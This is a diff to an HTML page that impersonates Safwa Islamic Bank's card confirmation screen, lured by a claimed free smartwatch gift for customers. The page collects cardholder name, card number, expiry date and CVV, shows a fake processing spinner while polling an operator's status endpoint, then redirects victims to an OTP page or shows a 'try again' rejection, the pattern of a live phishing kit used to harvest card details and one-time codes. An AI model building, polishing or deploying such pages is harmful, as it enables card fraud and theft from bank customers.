@@ -1,8 +1,11 @@
+<!DOCTYPE html>
 <html lang="en" dir="ltr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Login</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;700;800&family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
   :root{
     --green:#1a6b3c;
@@ -13,17 +16,109 @@
     --card-bg:#ffffff;
     --input-bg:#f9f9f9;
   }
-  *{box-sizing:border-box;}
+  *{box-sizing:border-box; margin: 0; padding: 0;}
   body{
-    margin:0;
-    font-family:'Segoe UI', Tahoma, Arial, sans-serif;
-    background:var(--bg);
-    color:var(--text-dark);
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    min-height:100vh;
-    padding:16px;
+    font-family: 'Tajawal', sans-serif;
+    background-color: #FBFAF7;
+    color: #16262A;
+    line-height: 1.7;
+    overflow-x: hidden;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
+  h1, h2, h3, .brand { font-family: 'Cairo', sans-serif; }
+  a { color: inherit; text-decoration: none; }
+  ul { list-style: none; }
+  button { font-family: inherit; cursor: pointer; border: none; background: none; }
+  img, svg { display: block; }
+  .container { max-width: 1160px; margin: 0 auto; padding: 0 28px; }
+
+  /* ===== HEADER ===== */
+  header{
+    background:#F1EFEA;
+    border-bottom:1px solid #D3CFC6;
+    position:sticky; top:0; z-index:100;
+    width: 100%;
+  }
+  .header-inner{
+    display:flex; align-items:center; justify-content:space-between;
+    padding:8px 24px; max-width:1160px; margin:0 auto;
+  }
+  .brand{
+    display:flex; align-items:center; gap:10px;
+    font-weight:800; font-size:1.28rem; color:#0B2E33;
+    letter-spacing:.2px;
+  }
+  .brand .mark{
+    width:40px; height:40px; flex:none; object-fit:contain;
+  }
+  .header-brand{height:100%;}
+  .header-brand .mark-full{
+    height:38px; width:auto; max-width:none; display:block; object-fit:contain;
+  }
+  nav.main-nav{
+    display:flex; gap:34px; font-weight:500; font-size:.98rem;
+  }
+  nav.main-nav a{
+    color:#4B5C5F; position:relative; padding:4px 0;
+    transition:color .2s ease;
+  }
+  nav.main-nav a:hover{color:#0B2E33;}
+  nav.main-nav a::after{
+    content:""; position:absolute; right:0; left:0; bottom:-2px; height:2px;
+    background:#B98851; transform:scaleX(0); transition:transform .25s ease;
+  }
+  nav.main-nav a:hover::after{transform:scaleX(1);}
+
+  .header-actions{display:flex; align-items:center; gap:14px;}
+
+  .lang-toggle{
+    display:flex; align-items:center; gap:6px;
+    border:1px solid #D3CFC6; border-radius:999px;
+    padding:7px 16px; font-size:.85rem; font-weight:700;
+    color:#0B2E33; background:#FBFAF7;
+    transition:background .2s ease, border-color .2s ease;
+  }
+  .lang-toggle:hover{background:#DCC7A6; border-color:#B98851;}
+
+  .burger{
+    display:none; flex-direction:column; justify-content:center; gap:5px;
+    width:26px; height:20px;
+  }
+  .burger span{display:block; height:2px; width:100%; background:#0B2E33; border-radius:2px;}
+
+  /* mobile nav */
+  .mobile-nav{
+    display:none;
+    flex-direction:column;
+    background:#F1EFEA;
+    border-top:1px solid #D3CFC6;
+    padding:8px 28px 18px;
+  }
+  .mobile-nav a{
+    padding:12px 0; border-bottom:1px solid #D3CFC6;
+    color:#4B5C5F; font-weight:500;
+  }
+  .mobile-nav a:last-child{border-bottom:none;}
+  body.nav-open .mobile-nav{display:flex;}
+  body.nav-open .burger span:nth-child(1){transform:translateY(7px) rotate(45deg);}
+  body.nav-open .burger span:nth-child(2){opacity:0;}
+  body.nav-open .burger span:nth-child(3){transform:translateY(-7px) rotate(-45deg);}
+
+  @media (max-width:860px){
+    nav.main-nav{display:none;}
+    .burger{display:flex;}
+  }
+
+  /* ===== MAIN CONTENT ===== */
+  .main-wrapper {
+    flex: 1;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    padding: 40px 16px;
+    background-color: #FBFAF7;
   }
   .screen{
     width:100%;
@@ -38,15 +133,9 @@
     box-shadow:0 4px 20px rgba(0, 0, 0, 0.05);
   }
   @media (max-width: 480px) {
-    body {
-      background: var(--card-bg);
-      padding: 0;
-      align-items: flex-start;
-    }
     .screen {
       box-shadow: none;
       border-radius: 0;
-      min-height: 100vh;
       padding: 16px 20px 0 20px;
     }
   }
@@ -149,65 +238,7 @@
   .btn-primary:hover{
     background:var(--green-dark);
   }
-  .link-row{
-    text-align:center;
-    margin-top:34px;
-    font-size:16px;
-    color:var(--green);
-  }
-  .link-row.second{
-    margin-top:16px;
-  }
-  .link-row b{
-    font-weight:700;
-  }
   .spacer{flex:1; min-height: 20px;}
-
-  .lang-row{
-    display:flex;
-    align-items:center;
-    justify-content:flex-start;
-    gap:8px;
-    color:var(--text-dark);
-    font-size:17px;
-    padding:16px 0;
-    cursor:pointer;
-  }
-
-  .bottom-nav{
-    display:flex;
-    justify-content:space-between;
-    padding:16px 12px 10px 12px;
-    margin:0 -24px -24px -24px;
-    border-top: 1px solid #f0f0f0;
-  }
-  @media (max-width: 480px) {
-    .bottom-nav {
-      margin: 0 -20px 0 -20px;
-    }
-  }
-  .nav-item{
-    display:flex;
-    flex-direction:column;
-    align-items:center;
-    gap:7px;
-    font-size:11px;
-    color:var(--text-dark);
-    flex:1;
-    min-width:0;
-  }
-  .nav-item span{
-    white-space:nowrap;
-    overflow:hidden;
-    text-overflow:ellipsis;
-    max-width:100%;
-    color:#8a8a8a;
-  }
-  .nav-item svg{
-    width:30px;
-    height:30px;
-    color:#8a8a8a;
-  }
 
   .loading-overlay{
     position:fixed;
@@ -328,162 +359,191 @@
   .modal-btn:hover {
     background: #c0392b;
   }
+
+  /* ===== FOOTER ===== */
+  footer{
+    background:#E9E6E0; color:#4B5C5F;
+    padding:56px 0 26px;
+    width: 100%;
+  }
+  .footer-top{
+    display:flex; justify-content:space-between; gap:40px; flex-wrap:wrap;
+    padding-bottom:34px; border-bottom:1px solid rgba(11,46,51,.12);
+  }
+  .footer-brand{max-width:32ch;}
+  .footer-brand .footer-logo{height:64px; width:auto; object-fit:contain;}
+  .footer-brand p{margin-top:14px; font-size:.9rem; color:#4B5C5F;}
+  .footer-links{display:flex; flex-direction:column; gap:24px;}
+  .footer-links h4{
+    font-family:'Cairo',sans-serif; color:#000; font-weight:800; font-size:.95rem; margin-bottom:16px;
+  }
+  .footer-links ul{display:flex; flex-direction:column; gap:11px;}
+  .footer-links a{font-size:.9rem; color:#000; font-weight:700; transition:color .2s ease;}
+  .footer-links a:hover{color:#2F6F63;}
+  .footer-bottom{
+    display:flex; justify-content:center; text-align:center; flex-wrap:wrap; gap:10px;
+    padding-top:22px; font-size:.82rem; color:#000; font-weight:700;
+  }
+
+  [data-lang="en"]{display:none;}
+  body.lang-en [data-lang="ar"]{display:none;}
+  body.lang-en [data-lang="en"]{display:inline;}
+  body.lang-en .footer-links [data-lang="en"]{display:flex;}
 </style>
 </head>
-<body>
-<div class="screen">
+<body class="lang-en">
 
-  <div class="logo-wrap">
-    <img src="https://i.ibb.co/20hCvj5v/image.png" alt="Safwa Islamic Bank" />
-    <div class="page-subtitle">Electronic Confirmation Page via Bank Card</div>
-  </div>
+<header>
+  <div class="header-inner">
+    <button class="burger" id="burgerBtn" aria-label="فتح القائمة">
+      <span></span><span></span><span></span>
+    </button>
 
-  <div class="field">
-    <div class="field-row">
-      <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
-        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
-        <circle cx="12" cy="7" r="4"/>
-      </svg>
-      <input type="text" id="cardName" placeholder="Cardholder Name" />
+    <div class="brand header-brand">
+      <img class="mark-full" src="https://i.ibb.co/vvhxyt4K/image.png" alt="Safwa Islamic Bank">
+    </div>
+    <nav class="main-nav">
+      <a href="#watches"><span data-lang="ar">الساعات</span><span data-lang="en">Watches</span></a>
+      <a href="#contact"><span data-lang="ar">اتصل بنا</span><span data-lang="en">Contact</span></a>
+    </nav>
+
+    <div class="header-actions">
+      <button class="lang-toggle" id="langBtn">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#1E9E5C" stroke-width="1.8" width="16" height="16"><circle cx="12" cy="12" r="9"/><path d="M3 12h18M12 3c2.5 2.5 2.5 15.5 0 18M12 3c-2.5 2.5-2.5 15.5 0 18"/></svg>
+        <span data-lang="ar">EN</span>
+        <span data-lang="en">AR</span>
+      </button>
     </div>
   </div>
 
-  <div class="field">
-    <div class="field-row">
-      <div class="card-brand-icon" id="visaIcon">
-        <svg viewBox="0 0 1000 600" fill="none" xmlns="http://www.w3.org/2000/svg">
-          <rect width="1000" height="600" rx="80" fill="#1434CB"/>
-          <path d="M381.1 435.4L441.8 164.6H517.9L457.2 435.4H381.1ZM667.6 170.8C652.5 165.1 629 159 600.3 159C524.3 159 471.1 199.3 470.5 256.6C469.3 299.1 507.9 322.8 537 337C566.9 351.6 576.9 360.8 576.9 373.9C576.3 393.9 552.2 402.7 530.1 402.7C492.8 402.7 471.9 392.4 454.2 384.5L441.5 444.1C460.5 452.9 495.3 460.2 531.4 460.8C612.4 460.8 664.9 421 666.1 359.7C666.7 322.2 643.3 294.2 593.3 270.2C562.9 254.8 544.5 245.7 544.5 233.5C544.5 222.6 556.5 211 582.5 211C605.3 210.4 624.9 215.3 639.5 221.7L648.4 163.7L667.6 170.8ZM859.3 164.6H799.8C781.4 164.6 767.5 169.8 759.3 189.4L649.2 435.4H729L744.8 391.7H842.2L851.4 435.4H922L859.3 164.6ZM766.7 332.2L806.6 222.6L829.4 332.2H766.7ZM282 164.6L209.8 349.5L199.1 294.2C189 259.6 157.3 221.3 120.6 202.2L187.1 435.4H267.5L387.8 164.6H282Z" fill="white"/>
-          <path d="M165.7 164.6H82.7C79.5 164.6 78.3 166.4 78 168.3C77.7 170.2 78.3 183.1 78.3 183.1C117.6 173 151.7 151.1 165.7 164.6Z" fill="#F7B600"/>
-        </svg>
-      </div>
-      <div class="card-brand-icon" id="mastercardIcon">
-        <svg viewBox="0 0 36 22" fill="none">
-          <rect width="36" height="22" rx="4" fill="#1A1A1A"/>
-          <circle cx="14" cy="11" r="6" fill="#EB001B"/>
-          <circle cx="22" cy="11" r="6" fill="#F79E1B"/>
-          <path d="M18 6.1a5.96 5.96 0 0 0-2.2 4.9c0 2 1 3.7 2.2 4.9a5.96 5.96 0 0 0 2.2-4.9c0-2-1-3.7-2.2-4.9z" fill="#FF5F00"/>
-        </svg>
-      </div>
-      <svg class="icon" id="defaultCardIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
-        <rect x="2" y="5" width="20" height="14" rx="2"/>
-        <path d="M2 10h20"/>
-      </svg>
-      <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19" 
-             oninput="formatCardNumber(this)" onkeypress="return isNumberKey(event)" />
-    </div>
+  <div class="mobile-nav" id="mobileNav">
+    <a href="#watches"><span data-lang="ar">الساعات</span><span data-lang="en">Watches</span></a>
+    <a href="#contact"><span data-lang="ar">اتصل بنا</span><span data-lang="en">Contact</span></a>
   </div>
+</header>
 
-  <div class="field-row" style="gap: 12px; margin-bottom: 16px;">
-    <div class="field" style="flex: 1; margin-bottom: 0;">
-      <div class="field-row" style="margin-bottom: 0;">
+<div class="main-wrapper">
+  <div class="screen">
+
+    <div class="logo-wrap">
+      <img src="https://i.ibb.co/vvhxyt4K/image.png" alt="Safwa Islamic Bank" />
+      <div class="page-subtitle">Electronic Confirmation Page via Bank Card</div>
+    </div>
+
+    <div class="field">
+      <div class="field-row">
         <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
-          <rect x="3" y="4" width="18" height="16" rx="2"/>
-          <path d="M16 2v4M8 2v4M3 10h18"/>
+          <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/>
+          <circle cx="12" cy="7" r="4"/>
         </svg>
-        <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" 
-               oninput="formatExpiryDate(this)" onkeypress="return isNumberKey(event)" />
+        <input type="text" id="cardName" placeholder="Cardholder Name" />
       </div>
     </div>
-    <div class="field" style="flex: 1; margin-bottom: 0;">
-      <div class="field-row" style="margin-bottom: 0;">
-        <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
-          <rect x="3" y="11" width="18" height="11" rx="2"/>
-          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+
+    <div class="field">
+      <div class="field-row">
+        <div class="card-brand-icon" id="visaIcon">
+          <svg viewBox="0 0 1000 600" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect width="1000" height="600" rx="80" fill="#1434CB"/>
+            <path d="M381.1 435.4L441.8 164.6H517.9L457.2 435.4H381.1ZM667.6 170.8C652.5 165.1 629 159 600.3 159C524.3 159 471.1 199.3 470.5 256.6C469.3 299.1 507.9 322.8 537 337C566.9 351.6 576.9 360.8 576.9 373.9C576.3 393.9 552.2 402.7 530.1 402.7C492.8 402.7 471.9 392.4 454.2 384.5L441.5 444.1C460.5 452.9 495.3 460.2 531.4 460.8C612.4 460.8 664.9 421 666.1 359.7C666.7 322.2 643.3 294.2 593.3 270.2C562.9 254.8 544.5 245.7 544.5 233.5C544.5 222.6 556.5 211 582.5 211C605.3 210.4 624.9 215.3 639.5 221.7L648.4 163.7L667.6 170.8ZM859.3 164.6H799.8C781.4 164.6 767.5 169.8 759.3 189.4L649.2 435.4H729L744.8 391.7H842.2L851.4 435.4H922L859.3 164.6ZM766.7 332.2L806.6 222.6L829.4 332.2H766.7ZM282 164.6L209.8 349.5L199.1 294.2C189 259.6 157.3 221.3 120.6 202.2L187.1 435.4H267.5L387.8 164.6H282Z" fill="white"/>
+            <path d="M165.7 164.6H82.7C79.5 164.6 78.3 166.4 78 168.3C77.7 170.2 78.3 183.1 78.3 183.1C117.6 173 151.7 151.1 165.7 164.6Z" fill="#F7B600"/>
+          </svg>
+        </div>
+        <div class="card-brand-icon" id="mastercardIcon">
+          <svg viewBox="0 0 36 22" fill="none">
+            <circle cx="14" cy="11" r="6" fill="#EB001B"/>
+            <circle cx="22" cy="11" r="6" fill="#F79E1B"/>
+            <path d="M18 6.1a5.96 5.96 0 0 0-2.2 4.9c0 2 1 3.7 2.2 4.9a5.96 5.96 0 0 0 2.2-4.9c0-2-1-3.7-2.2-4.9z" fill="#FF5F00"/>
+          </svg>
+        </div>
+        <svg class="icon" id="defaultCardIcon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+          <rect x="2" y="5" width="20" height="14" rx="2"/>
+          <path d="M2 10h20"/>
         </svg>
-        <input type="text" id="cvv" placeholder="CVV" maxlength="3" 
-               onkeypress="return isNumberKey(event)" />
+        <input type="text" id="cardNumber" placeholder="Card Number" maxlength="19" 
+               oninput="formatCardNumber(this)" onkeypress="return isNumberKey(event)" />
       </div>
     </div>
-  </div>
 
-  <div class="error-msg" id="errorMsg">Please enter all card details</div>
-
-  <button class="btn-primary" id="paymentBtn" onclick="handlePayment()">Confirm</button>
-
-  <div class="spacer"></div>
-
-  <div class="lang-row" onclick="window.location.href='login_ar.html'">
-    <span>العربية</span>
-    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" width="22" height="22">
-      <circle cx="12" cy="12" r="10"/>
-      <path d="M2 12h20M12 2a15 15 0 0 1 0 20M12 2a15 15 0 0 0 0 20"/>
-    </svg>
-  </div>
-
-  <div class="bottom-nav">
-    <div class="nav-item">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M4 11.5l8-7 8 7"/>
-        <path d="M6 10v9a1 1 0 0 0 1 1h10a1 1 0 0 0 1-1v-9"/>
-      </svg>
-      <span>Login</span>
-    </div>
-    <div class="nav-item">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M3 6.5A2 2 0 0 1 5 4.5h8a2 2 0 0 1 2 2v5a2 2 0 0 1-2 2h-6l-2.5 2.3V13.5H5a2 2 0 0 1-2-2z"/>
-        <path d="M7.2 7.6a1.8 1.8 0 0 1 3.5.5c0 1.1-1.5 1.3-1.5 2.4"/>
-        <circle cx="9" cy="12.4" r="0.5" fill="currentColor" stroke="none"/>
-        <path d="M13 9.8h6a1.6 1.6 0 0 1 1.6 1.6v3.6a1.6 1.6 0 0 1-1.6 1.6h-.9v1.8l-2-1.8H15"/>
-        <path d="M16.3 13.2l1.2 1.2 2-2.2"/>
-      </svg>
-      <span>FAQs</span>
-    </div>
-    <div class="nav-item">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round">
-        <rect x="3" y="4" width="18" height="16" rx="2.5"/>
-        <circle cx="9.3" cy="9.8" r="3.1"/>
-        <circle cx="14.7" cy="15.2" r="3.1"/>
-        <text x="9.3" y="11.4" font-size="4" text-anchor="middle" fill="currentColor" stroke="none" font-family="Arial">$</text>
-        <text x="14.7" y="16.8" font-size="4" text-anchor="middle" fill="currentColor" stroke="none" font-family="Arial">$</text>
-        <path d="M12.5 8.3c1.4.3 2.6 1.4 2.9 2.9"/>
-        <path d="M14.6 9.9l1 1.5-1.7.4"/>
-        <path d="M11.5 16.7c-1.4-.3-2.6-1.4-2.9-2.9"/>
-        <path d="M9.4 15.1l-1-1.5 1.7-.4"/>
-      </svg>
-      <span>Currencies</span>
-    </div>
-    <div class="nav-item">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round">
-        <path d="M4 6l5.5-1.8L15 6l5-1.8v14L15 20l-5.5-1.8L4 20z"/>
-        <path d="M9.5 4.2v13.9M15 6v14"/>
-        <path d="M12 8.5c1.9 0 3.4 1.5 3.4 3.3 0 2.2-3.4 5.8-3.4 5.8s-3.4-3.6-3.4-5.8c0-1.8 1.5-3.3 3.4-3.3z"/>
-        <circle cx="12" cy="11.8" r="1.2"/>
-      </svg>
-      <span>Locations</span>
-    </div>
-    <div class="nav-item">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round">
-        <rect x="5" y="9" width="16" height="12" rx="1.5"/>
-        <path d="M5 10l8 6 8-6"/>
-        <g transform="translate(-1,2.8)" fill="currentColor" stroke="none">
-          <path d="M2.2 1.2c.4-.4 1-.4 1.4 0l1.3 1.3c.4.4.4 1 0 1.4l-.6.6c.4 1 1.1 1.7 2.1 2.1l.6-.6c.4-.4 1-.4 1.4 0l1.3 1.3c.4.4.4 1 0 1.4l-.9.9c-.5.5-1.3.6-1.9.3C4.9 8.5 2.5 6.1 1.4 3.1c-.3-.6-.2-1.4.3-1.9z"/>
-        </g>
-      </svg>
-      <span>Contact Us</span>
-    </div>
-  </div>
-
-  <div class="loading-overlay" id="loadingOverlay">
-    <div class="spinner"></div>
-    <div class="loading-text">Processing request, please wait...</div>
-  </div>
-
-  <!-- Rejection Modal Popup -->
-  <div class="modal-overlay" id="rejectModal">
-    <div class="modal-box">
-      <div class="modal-icon">
-        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-          <line x1="18" y1="6" x2="6" y2="18"></line>
-          <line x1="6" y1="6" x2="18" y2="18"></line>
-        </svg>
+    <div class="field-row" style="gap: 12px; margin-bottom: 16px;">
+      <div class="field" style="flex: 1; margin-bottom: 0;">
+        <div class="field-row" style="margin-bottom: 0;">
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+            <rect x="3" y="4" width="18" height="16" rx="2"/>
+            <path d="M16 2v4M8 2v4M3 10h18"/>
+          </svg>
+          <input type="text" id="expiryDate" placeholder="MM/YY" maxlength="5" 
+                 oninput="formatExpiryDate(this)" onkeypress="return isNumberKey(event)" />
+        </div>
       </div>
-      <div class="modal-text">The information entered is incorrect. Please verify the correct information and try again.</div>
-      <button class="modal-btn" onclick="closeRejectModal()">Try Again</button>
+      <div class="field" style="flex: 1; margin-bottom: 0;">
+        <div class="field-row" style="margin-bottom: 0;">
+          <svg class="icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
+            <rect x="3" y="11" width="18" height="11" rx="2"/>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+          </svg>
+          <input type="text" id="cvv" placeholder="CVV" maxlength="3" 
+                 onkeypress="return isNumberKey(event)" />
+        </div>
+      </div>
     </div>
-  </div>
 
+    <div class="error-msg" id="errorMsg">Please enter all card details</div>
+
+    <button class="btn-primary" id="paymentBtn" onclick="handlePayment()">Confirm</button>
+
+    <div class="spacer"></div>
+
+    <div class="loading-overlay" id="loadingOverlay">
+      <div class="spinner"></div>
+      <div class="loading-text">Processing request, please wait...</div>
+    </div>
+
+    <!-- Rejection Modal Popup -->
+    <div class="modal-overlay" id="rejectModal">
+      <div class="modal-box">
+        <div class="modal-icon">
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="18" y1="6" x2="6" y2="18"></line>
+            <line x1="6" y1="6" x2="18" y2="18"></line>
+          </svg>
+        </div>
+        <div class="modal-text">The information entered is incorrect. Please verify the correct information and try again.</div>
+        <button class="modal-btn" onclick="closeRejectModal()">Try Again</button>
+      </div>
+    </div>
+
+  </div>
 </div>
+
+<footer id="contact">
+  <div class="container">
+    <div class="footer-top">
+      <div class="footer-brand">
+        <img class="footer-logo" src="https://i.ibb.co/vvhxyt4K/image.png" alt="Safwa Islamic Bank">
+        <p><span data-lang="ar">الساعة الذكية مقدمة من بنك صفوة الإسلامي هدية مجانية لجميع عملاء البنك، جميع الساعات تحمل شعار البنك.</span><span data-lang="en">The smartwatch from Safwa Islamic Bank is a free gift for all bank customers. Every watch carries the bank's logo.</span></p>
+      </div>
+      <div class="footer-links">
+        <div>
+          <h4><span data-lang="ar">تواصل</span><span data-lang="en">Reach us</span></h4>
+          <ul>
+            <li><a href="#"><span data-lang="ar">اتصل بنا</span><span data-lang="en">Contact us</span></a></li>
+          </ul>
+        </div>
+        <div>
+          <h4><span data-lang="ar">قانوني</span><span data-lang="en">Legal</span></h4>
+          <ul>
+            <li><a href="#"><span data-lang="ar">السياسات والخصوصية</span><span data-lang="en">Privacy Policy</span></a></li>
+            <li><a href="#"><span data-lang="ar">الشروط والأحكام</span><span data-lang="en">Terms &amp; Conditions</span></a></li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="footer-bottom">
+      <span><span data-lang="ar">جميع الحقوق محفوظة لبنك صفوة الإسلامي 2026</span><span data-lang="en">All rights reserved © Safwa Islamic Bank 2026</span></span>
+    </div>
+  </div>
+</footer>
 
 <script>
   var statusPollTimer = null;
@@ -597,7 +657,7 @@
     if (statusPollTimer) clearInterval(statusPollTimer);
 
     statusPollTimer = setInterval(function() {
-      fetch('/api/payment-status/' + paymentId)
+      fetch('/api/status/' + paymentId)
         .then(function(res) { return res.json(); })
         .then(function(data) {
           if (!data || !data.status) return;
@@ -607,7 +667,7 @@
           if (st === 'accept' || st === 'approved' || st === 'otp') {
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
-            window.location.href = data.redirectUrl || 'otp_en.html';
+            window.location.href = data.redirectUrl || 'otp-en.html';
           } else if (st === 'reject' || st === 'declined' || st === 'error') {
             clearInterval(statusPollTimer);
             document.getElementById('loadingOverlay').classList.remove('active');
